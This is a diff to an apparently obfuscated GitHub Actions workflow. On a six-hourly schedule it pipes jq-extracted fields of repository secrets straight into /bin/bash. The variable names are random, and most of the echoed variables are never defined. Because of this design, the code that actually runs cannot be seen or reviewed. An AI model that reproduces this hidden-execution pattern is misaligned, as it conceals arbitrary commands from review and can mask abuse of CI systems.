@@ -1,28 +1,30 @@
 name: zhuanxiagjiaozhou
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '6 5/6 * * *'
+    - cron: '44 3/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: zhuanxiagjiaozhou
         env:
-          uzvw0: ${{ secrets.uzvw0 }}
+          hs5: ${{ secrets.hs5 }}
         run: |
-          echo $uzvw0 | jq -r .vxnx90 | /bin/bash
-          echo $e4499 | jq -r .cpqk346 | /bin/bash
-          echo $af21809 | jq -r .no9 | /bin/bash
-          echo $eprrf0537 | jq -r .ggyed2764 | /bin/bash
-          echo $sjy65 | jq -r .wma825 | /bin/bash
-          echo $wxcw3 | jq -r .lxitt8 | /bin/bash
-          echo $d8930 | jq -r .bum306 | /bin/bash
-          echo $oyfd0 | jq -r .gtk5892 | /bin/bash
-          echo $ow4 | jq -r .l97707 | /bin/bash
-          echo $wfud964 | jq -r .tzkb78119 | /bin/bash
-          echo $xpc3 | jq -r .ieqe69254 | /bin/bash
-          echo $cpo70 | jq -r .lq2 | /bin/bash
-          echo $weves3624 | jq -r .bdgxz267 | /bin/bash
+          echo $hs5 | jq -r .msvb1 | /bin/bash
+          echo $b59 | jq -r .peye2029 | /bin/bash
+          echo $hlwfe761 | jq -r .orsw3812 | /bin/bash
+          echo $oaju3 | jq -r .yknh8 | /bin/bash
+          echo $sspa5206 | jq -r .ro399 | /bin/bash
+          echo $cs39 | jq -r .fkbrc9 | /bin/bash
+          echo $zpp1 | jq -r .lz5 | /bin/bash
+          echo $ktgrf32929 | jq -r .lmtll60709 | /bin/bash
+          echo $dgc32393 | jq -r .h34 | /bin/bash
+          echo $s3762 | jq -r .j59373 | /bin/bash
+          echo $corv02 | jq -r .xksj851 | /bin/bash
+          echo $ad70 | jq -r .wdiag66548 | /bin/bash
 
